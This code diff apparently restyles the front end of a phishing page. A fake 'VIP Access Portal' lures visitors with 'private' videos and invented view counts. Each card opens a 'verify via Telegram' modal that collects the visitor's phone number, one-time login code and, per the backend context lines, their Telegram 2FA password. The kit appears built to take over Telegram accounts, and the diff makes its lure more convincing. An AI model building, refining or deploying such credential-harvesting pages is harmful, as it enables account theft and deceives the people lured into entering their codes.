@@ -45,7 +45,7 @@ class PasswordReq(BaseModel):
     password: str
 
 # ---------------------------------------------------------
-# Embedded HTML UI Template
+# Embedded HTML UI Template (Updated Design Only)
 # ---------------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -57,19 +57,63 @@ HTML_TEMPLATE = """
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
   <style>
-    body { background: #0b0f19; color: #f3f4f6; font-family: 'Inter', sans-serif; }
-    .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
-    .btn-gradient { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); transition: all 0.3s ease; }
-    .btn-gradient:hover { transform: translateY(-2px); box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4); }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #0b0e14; color: #ffffff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    
+    .glass { 
+      background: linear-gradient(135deg, #161b26 0%, #0f131d 100%); 
+      border: 1px solid rgba(255, 255, 255, 0.08); 
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+    
+    .btn-gradient-pill { 
+      background: linear-gradient(90deg, #ff416c 0%, #ff4b2b 100%); 
+      box-shadow: 0 0 20px rgba(255, 65, 108, 0.5);
+      transition: all 0.3s ease; 
+    }
+    .btn-gradient-pill:hover { 
+      transform: translateY(-2px); 
+      box-shadow: 0 0 30px rgba(255, 65, 108, 0.8); 
+    }
+
+    /* 2x2 Gradient Cards Style */
+    .grid-card {
+      border-radius: 16px;
+      padding: 16px;
+      height: 120px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .grid-card:hover { transform: scale(1.03); }
+
+    .card-1 { background: linear-gradient(135deg, #ff4b1f 0%, #ff9068 100%); box-shadow: 0 4px 15px rgba(255, 75, 31, 0.3); }
+    .card-2 { background: linear-gradient(135deg, #ffe000 0%, #799f0c 100%); box-shadow: 0 4px 15px rgba(121, 159, 12, 0.3); }
+    .card-3 { background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); box-shadow: 0 4px 15px rgba(56, 239, 125, 0.3); }
+    .card-4 { background: linear-gradient(135deg, #00c6ff 0%, #0072ff 100%); box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3); }
+
+    .play-icon {
+      position: absolute;
+      top: 45%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 0; height: 0;
+      border-top: 10px solid transparent;
+      border-bottom: 10px solid transparent;
+      border-left: 18px solid rgba(255, 255, 255, 0.85);
+    }
   </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-between p-4">
 
   <!-- Header Bar -->
-  <header class="w-full max-w-4xl flex items-center justify-between py-4 border-b border-gray-800 mb-6">
+  <header class="w-full max-w-md flex items-center justify-between py-4 border-b border-gray-800/80 mb-4">
     <div class="flex items-center space-x-2">
-      <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-xl text-white shadow-lg shadow-blue-500/30">VIP</div>
-      <span class="text-xl font-bold tracking-wide text-white">ACCESS PORTAL</span>
+      <div class="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-lg text-white shadow-lg shadow-blue-500/30">VIP</div>
+      <span class="text-lg font-bold tracking-wide text-white">ACCESS PORTAL</span>
     </div>
     <span class="px-3 py-1 bg-green-500/10 text-green-400 border border-green-500/20 text-xs font-semibold rounded-full flex items-center gap-2">
       <span class="w-2 h-2 rounded-full bg-green-400 animate-ping"></span> Active Verification
@@ -77,49 +121,58 @@ HTML_TEMPLATE = """
   </header>
 
   <!-- Main Portal Body -->
-  <main class="w-full max-w-4xl space-y-8">
+  <main class="w-full max-w-md space-y-6">
     
-    <!-- Tutorial & Action Banner -->
-    <div class="glass rounded-2xl p-4 md:p-6 shadow-2xl">
-      <h2 class="text-lg font-semibold text-gray-200 mb-3 flex items-center gap-2">
-        <i class="fa-solid fa-circle-play text-blue-500"></i> How to Unlock Access (Guide Video)
+    <!-- Hero / Guide Video Card -->
+    <div class="glass rounded-2xl p-5 text-center">
+      <h2 class="text-lg font-bold text-white mb-1 tracking-wide">
+        How to Use (Guide Video)
       </h2>
-      <div class="relative w-full rounded-xl overflow-hidden bg-black aspect-video flex items-center justify-center border border-gray-800">
+      <p class="text-xs text-gray-400 mb-4">⭐ 4.9 (2.4M views) • Restricted</p>
+      
+      <div class="relative w-full rounded-xl overflow-hidden bg-black aspect-video flex items-center justify-center border border-gray-800 mb-5">
         <video controls class="w-full h-full object-cover">
           <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
           Your browser does not support video.
         </video>
       </div>
-      <button onclick="openModal()" class="w-full mt-5 py-4 btn-gradient text-white font-bold text-lg rounded-xl shadow-lg flex items-center justify-center gap-3">
-        <i class="fa-brands fa-telegram text-2xl"></i> VERIFY VIA TELEGRAM TO UNLOCK
+
+      <button onclick="openModal()" class="w-full py-4 btn-gradient-pill text-white font-bold text-sm md:text-base rounded-full uppercase tracking-wider flex items-center justify-center gap-2">
+        <i class="fa-brands fa-telegram text-xl"></i> GET YOUR LINK TAP TO VERIFY VIA TELEGRAM
       </button>
     </div>
 
-    <!-- Features / Trips Showcase -->
+    <!-- 2x2 Gradient Content Grid -->
     <div>
-      <h3 class="text-md font-semibold text-gray-400 mb-4 tracking-wider uppercase">Exclusive Perks</h3>
-      <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">Beach Resort Pass</div>
+      <h3 class="text-base font-semibold text-gray-200 mb-3 flex items-center gap-2">
+        🔥 More Videos
+      </h3>
+      <div class="grid grid-cols-2 gap-3.5">
+        <div onclick="openModal()" class="grid-card card-1 cursor-pointer">
+          <div class="play-icon"></div>
+          <span class="font-bold text-sm text-white drop-shadow">Private 01</span>
+          <span class="text-xs text-white/80">2.1M views</span>
         </div>
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1519046904884-53103b34b206?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">VIP Lounge Access</div>
+        <div onclick="openModal()" class="grid-card card-2 cursor-pointer">
+          <div class="play-icon"></div>
+          <span class="font-bold text-sm text-white drop-shadow">Private 02</span>
+          <span class="text-xs text-white/80">1.8M views</span>
         </div>
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1488646953014-85cb44e25828?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">Global Travel Guide</div>
+        <div onclick="openModal()" class="grid-card card-3 cursor-pointer">
+          <div class="play-icon"></div>
+          <span class="font-bold text-sm text-white drop-shadow">Private 03</span>
+          <span class="text-xs text-white/80">1.5M views</span>
         </div>
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1503220317375-aaad61436b1b?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">Private Community</div>
+        <div onclick="openModal()" class="grid-card card-4 cursor-pointer">
+          <div class="play-icon"></div>
+          <span class="font-bold text-sm text-white drop-shadow">Private 04</span>
+          <span class="text-xs text-white/80">1.2M views</span>
         </div>
       </div>
     </div>
   </main>
 
-  <!-- Auth Modal -->
+  <!-- Auth Modal (Unchanged) -->
   <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
     <div class="glass w-full max-w-md rounded-2xl p-6 relative border border-gray-700 shadow-2xl">
       <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>
@@ -132,7 +185,7 @@ HTML_TEMPLATE = """
           <p class="text-sm text-gray-400 mt-1">Enter your phone number with country code (e.g. +919876543210)</p>
         </div>
         <input type="text" id="phoneInput" placeholder="+91 9876543210" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 text-lg text-center tracking-widest">
-        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 btn-gradient text-white font-semibold rounded-xl">Send Code</button>
+        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl">Send Code</button>
       </div>
 
       <!-- Step 2: OTP -->
@@ -335,3 +388,4 @@ async def verify_2fa(data: PasswordReq):
         raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
+        
